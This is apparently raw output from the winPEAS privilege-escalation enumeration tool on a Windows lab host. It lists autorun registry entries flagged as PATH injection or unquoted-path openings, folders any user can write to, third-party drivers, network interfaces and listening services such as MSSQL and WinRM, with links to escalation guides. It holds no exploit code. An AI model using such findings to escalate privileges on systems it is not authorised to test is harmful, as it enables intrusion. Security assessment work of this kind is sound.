È Check if you can modify other users AutoRuns binaries (Note that is normal that you can modify HKCU registry and binaries indicated there) https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries
Error getting autoruns from WMIC: System.Management.ManagementException: Access denied
   at System.Management.ThreadDispatch.Start()
   at System.Management.ManagementScope.Initialize()
   at System.Management.ManagementObjectSearcher.Initialize()
   at System.Management.ManagementObjectSearcher.Get()
   at winPEAS.Info.ApplicationInfo.AutoRuns.GetAutoRunsWMIC()

    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    Key: SecurityHealth
    Folder: C:\Windows\system32
    File: C:\Windows\system32\SecurityHealthSystray.exe
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    Key: VMware User Process
    Folder: C:\Program Files\VMware\VMware Tools
    File: C:\Program Files\VMware\VMware Tools\vmtoolsd.exe -n vmusr (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    RegPerms: celia.almeda [FullControl]
    Key: OneDrive
    Folder: C:\Users\celia.almeda\AppData\Local\Microsoft\OneDrive
    FolderPerms: celia.almeda [AllAccess]
    File: C:\Users\celia.almeda\AppData\Local\Microsoft\OneDrive\OneDrive.exe /background
    FilePerms: celia.almeda [AllAccess]
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
    Key: Common Startup
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
    Key: Common Startup
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    Key: Userinit
    Folder: C:\Windows\system32
    File: C:\Windows\system32\userinit.exe,
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    Key: Shell
    Folder: None (PATH Injection)
    File: explorer.exe
   =================================================================================================


    RegPath: HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot
    Key: AlternateShell
    Folder: None (PATH Injection)
    File: cmd.exe
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Font Drivers
    Key: Adobe Type Manager
    Folder: None (PATH Injection)
    File: atmfd.dll
   =================================================================================================


    RegPath: HKLM\Software\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers
    Key: Adobe Type Manager
    Folder: None (PATH Injection)
    File: atmfd.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: aux
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midi
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midimapper
    Folder: None (PATH Injection)
    File: midimap.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: mixer
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.imaadpcm
    Folder: None (PATH Injection)
    File: imaadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msadpcm
    Folder: None (PATH Injection)
    File: msadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msg711
    Folder: None (PATH Injection)
    File: msg711.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msgsm610
    Folder: None (PATH Injection)
    File: msgsm32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.i420
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.iyuv
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.mrle
    Folder: None (PATH Injection)
    File: msrle32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.msvc
    Folder: None (PATH Injection)
    File: msvidc32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.uyvy
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yuy2
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvu9
    Folder: None (PATH Injection)
    File: tsbyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvyu
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wave
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wavemapper
    Folder: None (PATH Injection)
    File: msacm32.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.l3acm
    Folder: C:\Windows\System32
    File: C:\Windows\System32\l3codeca.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: aux
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midi
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midimapper
    Folder: None (PATH Injection)
    File: midimap.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: mixer
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.imaadpcm
    Folder: None (PATH Injection)
    File: imaadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msadpcm
    Folder: None (PATH Injection)
    File: msadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msg711
    Folder: None (PATH Injection)
    File: msg711.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msgsm610
    Folder: None (PATH Injection)
    File: msgsm32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.cvid
    Folder: None (PATH Injection)
    File: iccvid.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.i420
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.iyuv
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.mrle
    Folder: None (PATH Injection)
    File: msrle32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.msvc
    Folder: None (PATH Injection)
    File: msvidc32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.uyvy
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yuy2
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvu9
    Folder: None (PATH Injection)
    File: tsbyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvyu
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wave
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wavemapper
    Folder: None (PATH Injection)
    File: msacm32.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.l3acm
    Folder: C:\Windows\SysWOW64
    File: C:\Windows\SysWOW64\l3codeca.acm
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _wow64cpu
    Folder: None (PATH Injection)
    File: wow64cpu.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _wowarmhw
    Folder: None (PATH Injection)
    File: wowarmhw.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _xtajit
    Folder: None (PATH Injection)
    File: xtajit.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: advapi32
    Folder: None (PATH Injection)
    File: advapi32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: clbcatq
    Folder: None (PATH Injection)
    File: clbcatq.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: combase
    Folder: None (PATH Injection)
    File: combase.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: COMDLG32
    Folder: None (PATH Injection)
    File: COMDLG32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: coml2
    Folder: None (PATH Injection)
    File: coml2.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: DifxApi
    Folder: None (PATH Injection)
    File: difxapi.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: gdi32
    Folder: None (PATH Injection)
    File: gdi32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: gdiplus
    Folder: None (PATH Injection)
    File: gdiplus.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: IMAGEHLP
    Folder: None (PATH Injection)
    File: IMAGEHLP.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: IMM32
    Folder: None (PATH Injection)
    File: IMM32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: kernel32
    Folder: None (PATH Injection)
    File: kernel32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: MSCTF
    Folder: None (PATH Injection)
    File: MSCTF.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: MSVCRT
    Folder: None (PATH Injection)
    File: MSVCRT.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: NORMALIZ
    Folder: None (PATH Injection)
    File: NORMALIZ.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: NSI
    Folder: None (PATH Injection)
    File: NSI.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: ole32
    Folder: None (PATH Injection)
    File: ole32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: OLEAUT32
    Folder: None (PATH Injection)
    File: OLEAUT32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: PSAPI
    Folder: None (PATH Injection)
    File: PSAPI.DLL
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: rpcrt4
    Folder: None (PATH Injection)
    File: rpcrt4.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: sechost
    Folder: None (PATH Injection)
    File: sechost.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: Setupapi
    Folder: None (PATH Injection)
    File: Setupapi.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHCORE
    Folder: None (PATH Injection)
    File: SHCORE.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHELL32
    Folder: None (PATH Injection)
    File: SHELL32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHLWAPI
    Folder: None (PATH Injection)
    File: SHLWAPI.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: user32
    Folder: None (PATH Injection)
    File: user32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: WLDAP32
    Folder: None (PATH Injection)
    File: WLDAP32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: wow64
    Folder: None (PATH Injection)
    File: wow64.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: wow64win
    Folder: None (PATH Injection)
    File: wow64win.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: WS2_32
    Folder: None (PATH Injection)
    File: WS2_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{2C7339CF-2B09-4501-B3F3-F3508C9228ED}
    Key: StubPath
    Folder: \
    FolderPerms: Authenticated Users [AppendData/CreateDirectories]
    File: /UserInstall
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{6BF52A52-394A-11d3-B153-00C04F79FAA6}
    Key: StubPath
    Folder: C:\Windows\system32
    File: C:\Windows\system32\unregmp2.exe /FirstLogon
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4340}
    Key: StubPath
    Folder: None (PATH Injection)
    File: U
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4383}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\ie4uinit.exe -UserConfig
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\Rundll32.exe C:\Windows\System32\mscories.dll,Install
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{9459C573-B17A-45AE-9F64-1857B5D58CEE}
    Key: StubPath
    Folder: C:\Program Files (x86)\Microsoft\Edge\Application\100.0.1185.29\Installer
    File: C:\Program Files (x86)\Microsoft\Edge\Application\100.0.1185.29\Installer\setup.exe --configure-user-settings --verbose-logging --system-level --msedge --channel=stable (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{6BF52A52-394A-11d3-B153-00C04F79FAA6}
    Key: StubPath
    Folder: C:\Windows\system32
    File: C:\Windows\system32\unregmp2.exe /FirstLogon
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}
    Key: StubPath
    Folder: C:\Windows\SysWOW64
    File: C:\Windows\SysWOW64\Rundll32.exe C:\Windows\SysWOW64\mscories.dll,Install
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\{1FD49718-1D00-4B19-AF5F-070AF6D5D54C}
    Folder: C:\Program Files (x86)\Microsoft\Edge\Application\100.0.1185.29\BHO
    File: C:\Program Files (x86)\Microsoft\Edge\Application\100.0.1185.29\BHO\ie_to_edge_bho_64.dll (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\{1FD49718-1D00-4B19-AF5F-070AF6D5D54C}
    Folder: C:\Program Files (x86)\Microsoft\Edge\Application\100.0.1185.29\BHO
    File: C:\Program Files (x86)\Microsoft\Edge\Application\100.0.1185.29\BHO\ie_to_edge_bho_64.dll (Unquoted and Space detected)
   =================================================================================================


    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
    File: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected)
   =================================================================================================


    Folder: C:\Users\celia.almeda\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
    FolderPerms: celia.almeda [AllAccess]
    File: C:\Users\celia.almeda\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected)
    FilePerms: celia.almeda [AllAccess]
   =================================================================================================


    Folder: C:\windows\tasks
    FolderPerms: Authenticated Users [WriteData/CreateFiles]
   =================================================================================================


    Folder: C:\windows\system32\tasks
    FolderPerms: Authenticated Users [WriteData/CreateFiles]
   =================================================================================================


    Folder: C:\windows
    File: C:\windows\system.ini
   =================================================================================================


    Folder: C:\windows
    File: C:\windows\win.ini
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Scheduled Applications --Non Microsoft--
È Check if you can modify other users scheduled binaries https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries

ÉÍÍÍÍÍÍÍÍÍÍ¹ Device Drivers --Non Microsoft--
È Check 3rd party drivers for known vulnerabilities/rootkits. https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#vulnerable-drivers
    QLogic 10 GigE - 7.13.65.105 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\evbda.sys
    QLogic Gigabit Ethernet - 7.12.31.105 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxvbda.sys
    VMware vSockets Service - 9.8.19.0 build-18956547 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vsock.sys
    NVIDIA nForce(TM) RAID Driver - 10.6.0.23 [NVIDIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\nvraid.sys
    VMware PCI VMCI Bus Device - 9.8.18.0 build-18956547 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmci.sys
    Intel Matrix Storage Manager driver - 8.6.2.1019 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\iaStorV.sys
    VIA RAID driver - 7.0.9600,6352 [VIA Technologies Inc.,Ltd]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vsmraid.sys
    LSI 3ware RAID Controller - WindowsBlue [LSI]: \\.\GLOBALROOT\SystemRoot\System32\drivers\3ware.sys
    AHCI 1.3 Device Driver - 1.1.3.277 [Advanced Micro Devices]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdsata.sys
    Storage Filter Driver - 1.1.3.277 [Advanced Micro Devices]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdxata.sys
    AMD Technology AHCI Compatible Controller - 3.7.1540.43 [AMD Technologies Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdsbs.sys
    Adaptec RAID Controller - 7.5.0.32048 [PMC-Sierra, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\arcsas.sys
    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ItSas35i.sys
    LSI Fusion-MPT SAS Driver (StorPort) - 1.34.03.83 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas.sys
    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas2i.sys
    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas3i.sys
    LSI SSS PCIe/Flash Driver (StorPort) - 2.10.61.81 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sss.sys
    MEGASAS RAID Controller Driver for Windows - 6.706.06.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasas.sys
    MEGASAS RAID Controller Driver for Windows - 6.714.20.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\MegaSas2i.sys
    MEGASAS RAID Controller Driver for Windows - 7.710.10.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasas35i.sys
    MegaRAID Software RAID - 15.02.2013.0129 [LSI Corporation, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasr.sys
    Marvell Flash Controller -  1.0.5.1016  [Marvell Semiconductor, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\mvumis.sys
    NVIDIA nForce(TM) SATA Driver - 10.6.0.23 [NVIDIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\nvstor.sys
    MEGASAS RAID Controller Driver for Windows - 6.805.03.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\percsas2i.sys
    MEGASAS RAID Controller Driver for Windows - 6.604.06.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\percsas3i.sys
    Microsoftr Windowsr Operating System - 2.60.01 [Silicon Integrated Systems Corp.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\SiSRaid2.sys
    Microsoftr Windowsr Operating System - 6.1.6918.0 [Silicon Integrated Systems]: \\.\GLOBALROOT\SystemRoot\System32\drivers\sisraid4.sys
    VIA StorX RAID Controller Driver - 8.0.9200.8110 [VIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vstxraid.sys
     Promiser SuperTrak EX Series -  5.1.0000.10 [Promise Technology, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\stexstor.sys
    Chelsio Communications iSCSI Controller - 10.0.10011.16384 [Chelsio Communications]: \\.\GLOBALROOT\SystemRoot\System32\drivers\cht4sx64.sys
    Intel(R) Rapid Storage Technology driver (inbox) - 15.44.0.1015 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\iaStorAVC.sys
    PMC-Sierra HBA Controller - 1.3.0.10769 [PMC-Sierra]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ADP80XX.SYS
    Smart Array SAS/SATA Controller Media Driver - 8.0.4.0 Build 1 Media Driver (x86-64) [Hewlett-Packard Company]: \\.\GLOBALROOT\SystemRoot\System32\drivers\HpSAMD.sys
    VMware PVSCSI StorPort driver (64-bit) - 1.3.17.0 build-17958848 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\pvscsi.sys
    SmartRAID, SmartHBA PQI Storport Driver - 1.50.1.0 [Microsemi Corportation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\SmartSAMD.sys
    VMware Pointing PS/2 Device Driver - 12.5.12.0 build-18967789 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmmouse.sys
    VMware SVGA 3D - 9.17.01.0002 - build-18913173 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vm3dmp_loader.sys
    VMware SVGA 3D - 9.17.01.0002 - build-18913173 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vm3dmp.sys
    VMware server memory controller - 7.5.7.0 build-18933738 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vmmemctl.sys
    VMware PCIe Ethernet Adapter NDIS 6.30 (64-bit) - 1.9.5.0 build-18933738 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmxnet3.sys


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Network Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Network Shares
  [X] Exception: Access denied

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerate Network Mapped Drives (WMI)

ÉÍÍÍÍÍÍÍÍÍÍ¹ Host File

ÉÍÍÍÍÍÍÍÍÍÍ¹ Network Ifaces and known hosts
È The masks are only for the IPv4 addresses
    Ethernet0[00:50:56:9E:AC:C2]: 10.10.105.142 / 255.255.255.0
        Gateways: 10.10.105.254
        DNSs: 10.10.105.140
        Known hosts:
          10.10.105.140         00-50-56-9E-44-6A     Dynamic
          10.10.105.141         00-50-56-9E-4D-93     Dynamic
          10.10.105.254         00-00-00-00-00-00     Invalid
          10.10.105.255         FF-FF-FF-FF-FF-FF     Static
          169.254.169.254       00-00-00-00-00-00     Invalid
          172.16.50.254         00-00-00-00-00-00     Invalid
          224.0.0.22            01-00-5E-00-00-16     Static
          224.0.0.251           01-00-5E-00-00-FB     Static
          224.0.0.252           01-00-5E-00-00-FC     Static
          239.255.255.250       01-00-5E-7F-FF-FA     Static

    Loopback Pseudo-Interface 1[]: 127.0.0.1, ::1 / 255.0.0.0
        DNSs: fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1
        Known hosts:
          224.0.0.22            00-00-00-00-00-00     Static
          239.255.255.250       00-00-00-00-00-00     Static


ÉÍÍÍÍÍÍÍÍÍÍ¹ Current TCP Listening Ports
È Check for services restricted from the outside
  Enumerating IPv4 connections

  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name

  TCP        0.0.0.0               135           0.0.0.0               0               Listening         912             svchost
  TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               1433          0.0.0.0               0               Listening         4336            sqlservr
  TCP        0.0.0.0               5040          0.0.0.0               0               Listening         5656            svchost
  TCP        0.0.0.0               5985          0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               47001         0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               49664         0.0.0.0               0               Listening         700             lsass
  TCP        0.0.0.0               49665         0.0.0.0               0               Listening         548             wininit
  TCP        0.0.0.0               49666         0.0.0.0               0               Listening         1256            svchost
  TCP        0.0.0.0               49667         0.0.0.0               0               Listening         1776            svchost
  TCP        0.0.0.0               49668         0.0.0.0               0               Listening         700             lsass
  TCP        0.0.0.0               49669         0.0.0.0               0               Listening         2040            svchost
  TCP        0.0.0.0               49670         0.0.0.0               0               Listening         676             services
  TCP        0.0.0.0               49700         0.0.0.0               0               Listening         4336            sqlservr
  TCP        10.10.105.142         139           0.0.0.0               0               Listening         4               System

  Enumerating IPv6 connections

  Protocol   Local Address                               Local Port    Remote Address                              Remote Port     State             Process ID      Process Name

  TCP        [::]                                        135           [::]                                        0               Listening         912             svchost
  TCP        [::]                                        445           [::]                                        0               Listening         4               System
  TCP        [::]                                        1433          [::]                                        0               Listening         4336            sqlservr
  TCP        [::]                                        5985          [::]                                        0               Listening         4               System
  TCP        [::]                                        47001         [::]                                        0               Listening         4               System
  TCP        [::]                                        49664         [::]                                        0               Listening         700             lsass
  TCP        [::]                                        49665         [::]                                        0               Listening         548             wininit
  TCP        [::]                                        49666         [::]                                        0               Listening         1256            svchost
  TCP        [::]                                        49667         [::]                                        0               Listening         1776            svchost
  TCP        [::]                                        49668         [::]                                        0               Listening         700             lsass
  TCP        [::]                                        49669         [::]                                        0               Listening         2040            svchost
  TCP        [::]                                        49670         [::]                                        0               Listening         676             services
  TCP        [::]                                        49700         [::]                                        0               Listening         4336            sqlservr

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current UDP Listening Ports
È Check for services restricted from the outside
  Enumerating IPv4 connections

  Protocol   Local Address         Local Port    Remote Address:Remote Port     Process ID        Process Name

  UDP        0.0.0.0               123           *:*                            544               svchost
